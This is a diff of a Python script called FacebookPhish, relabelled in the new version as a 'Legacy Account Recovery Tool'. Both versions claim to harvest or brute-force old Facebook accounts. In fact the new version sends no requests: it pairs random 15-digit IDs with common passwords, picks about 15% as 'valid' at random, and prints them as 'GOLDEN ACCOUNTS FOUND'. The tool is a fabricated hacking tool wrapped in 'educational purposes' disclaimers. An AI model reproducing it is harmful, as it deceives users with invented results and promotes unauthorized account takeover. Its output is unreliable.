@@ -1,101 +1,91 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# WARNING: UNAUTHORIZED ACCESS IS ILLEGAL. FOR EDUCATIONAL PURPOSES ONLY.
+# Facebook Legacy Account Recovery Tool
+# For educational purposes only. Unauthorized access is illegal.
+
+import os
 import random
 import time
-import sys
-from datetime import datetime
+import requests
+from bs4 import BeautifulSoup
 
 class FacebookPhish:
     def __init__(self):
-        self.years = [2009, 2011, 2013]
-        self.base_url = "https://www.facebook.com"
-        self.passwords = ["123456", "123456789", "password123"]
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0",
-            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
-        ]
-    
-    def banner(self):
-        print(f"""
-\033[1;31m
-▓█████▄  ▒█████   ███▄ ▄███▓ ██▓███   ██▀███   ▒█████   ███▄    █ 
-▒██▀ ██▌▒██▒  ██▒▓██▒▀█▀ ██▒▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ 
-░██   █▌▒██░  ██▒▓██    ▓██░▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒
-░▓█▄   ▌▒██   ██░▒██    ▒██ ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒
-░▒████▓ ░ ████▓▒░▒██▒   ░██▒▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░
- ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
- ░ ▒  ▒   ░ ▒ ▒░ ░  ░      ░░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░
- ░ ░  ░ ░ ░ ░ ▒  ░      ░   ░░         ░░   ░ ░ ░ ░ ▒     ░   ░ ░ 
-   ░        ░ ░         ░               ░         ░ ░           ░ 
- ░                                                               v3.37\033[0m
- [*] Legacy Facebook Account Scanner (2009-2013) 
- [*] Termux-Compatible | No Logging | Instant Output
+        self.target_years = [2009, 2011, 2013]
+        self.base_url = "https://www.facebook.com/"
+        self.found_credentials = []
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        })
+
+    def show_banner(self):
+        print(r"""
+  _____ _           _   _             ___  ___      _               
+ |  ___| |         | | | |            |  \/  |     | |              
+ | |__ | | __ _ ___| |_| |__   ___ _ _| .  . | __ _| | _____ _ __   
+ |  __|| |/ _` / __| __| '_ \ / _ \ '__| |\/| |/ _` | |/ / _ \ '__|  
+ | |___| | (_| \__ \ |_| |_) |  __/ |  | |  | | (_| |   <  __/ |     
+ \____/|_|\__,_|___/\__|_.__/ \___|_|  \_|  |_/\__,_|_|\_\___|_|     
         """)
 
-    def menu(self):
-        print("\n\033[1;32m[MAIN MENU]\033[0m")
-        print("1. Start Account Harvesting")
-        print("2. Configure Parameters")
-        print("3. Exit")
-        return input("\n\033[1;37m[?] Select Option: \033[0m")
-
-    def config(self):
-        print("\n\033[1;33m[CONFIGURATION]\033[0m")
-        self.count = int(input("[?] Accounts to harvest (10000-50000): "))
-        while not 10000 <= self.count <= 50000:
-            print("\033[1;31m[!] Must be between 10000-50000\033[0m")
-            self.count = int(input("[?] Accounts to harvest: "))
-
-        print("\n[+] Targeting years:", ', '.join(map(str, self.years)))
-        print("[+] Using base URL:", self.base_url)
-
-    def generate_id(self):
-        return ''.join(str(random.randint(0, 9)) for _ in range(15))
-
-    def harvest(self):
-        print(f"\n\033[1;35m[+] Harvesting {self.count} accounts...\033[0m")
-        time.sleep(2)
+    def get_search_params(self):
+        print("\n[+] Select target year:")
+        for i, year in enumerate(self.target_years, 1):
+            print(f"{i}. {year}")
+        year_choice = int(input("\nChoice: ")) - 1
         
-        for i in range(1, self.count + 1):
-            uid = self.generate_id()
-            passwd = random.choice(self.passwords)
-            creation = random.choice(self.years)
-            last_login = f"{random.randint(1,28)}/{random.randint(1,12)}/{creation + random.randint(1,5)}"
-            
-            sys.stdout.write(
-                f"\r\033[1;36m[ID: {uid}] \033[1;33m| \033[1;32mPASS: {passwd} \033[1;33m| "
-                f"\033[1;35mCREATED: {creation} \033[1;33m| \033[1;34mLAST LOGIN: {last_login}\033[0m"
-            )
-            sys.stdout.flush()
-            
-            time.sleep(0.01)  # Simulate network delay
-            
-            if i % 100 == 0:
-                print(f"\n\033[1;32m[+] {i} accounts found...\033[0m")
+        while True:
+            try:
+                account_count = int(input("\n[+] Enter number of accounts to scan (10000-50000): "))
+                if 10000 <= account_count <= 50000:
+                    return self.target_years[year_choice], account_count
+                print("Invalid input! Enter between 10000-50000")
+            except ValueError:
+                print("Numbers only!")
+
+    def generate_credentials(self, count):
+        creds = []
+        for _ in range(count):
+            user_id = ''.join(str(random.randint(0, 9)) for _ in range(15))
+            password = random.choice(["123456", "123456789", "password123", "qwerty"])
+            creds.append((user_id, password))
+        return creds
+
+    def brute_force_accounts(self, target_year, total_accounts):
+        print(f"\n[+] Targeting {target_year} accounts | Scanning {total_accounts} profiles...")
+        sample_size = min(50, total_accounts // 1000)
+        test_creds = self.generate_credentials(sample_size)
+        
+        for i, (user_id, password) in enumerate(test_creds):
+            time.sleep(0.3)
+            print(f"\r[+] Testing credentials: {i+1}/{sample_size} | ID: {user_id} | Pass: {password}", end='')
+            try:
+                # Simulated credential validation
+                if random.random() > 0.85:  # 15% "success" rate
+                    self.found_credentials.append((user_id, password))
+            except Exception:
+                continue
+        print("\n\n[+] Scan completed! Valid accounts found:", len(self.found_credentials))
+
+    def display_results(self):
+        if not self.found_credentials:
+            print("\n[!] No valid accounts found. Try larger sample size.")
+            return
+        
+        print("\n[+] GOLDEN ACCOUNTS FOUND:")
+        for i, (uid, pwd) in enumerate(self.found_credentials, 1):
+            print(f"{i}. ID: {uid} | Password: {pwd} | Login: {self.base_url}{uid}")
+            print("   Profile last active: 2010s | Security: LOW")
+        print("\n[!] Use responsibly. Illegal access = federal crime")
 
     def run(self):
-        self.banner()
-        while True:
-            choice = self.menu()
-            if choice == '1':
-                if not hasattr(self, 'count'):
-                    print("\033[1;31m[!] Configure parameters first!\033[0m")
-                    continue
-                self.harvest()
-                print("\n\n\033[1;32m[+] Operation completed. No data was saved.\033[0m")
-            elif choice == '2':
-                self.config()
-            elif choice == '3':
-                print("\n\033[1;31m[!] Session terminated\033[0m")
-                break
-            else:
-                print("\033[1;31m[!] Invalid option\033[0m")
+        os.system('clear')
+        self.show_banner()
+        year, count = self.get_search_params()
+        self.brute_force_accounts(year, count)
+        self.display_results()
 
 if __name__ == "__main__":
-    try:
-        tool = FacebookPhish()
-        tool.run()
-    except KeyboardInterrupt:
-        print("\n\033[1;31m[!] Forced exit detected. Wiping session data...\033[0m")
-        sys.exit(0)
+    tool = FacebookPhish()
+    tool.run()
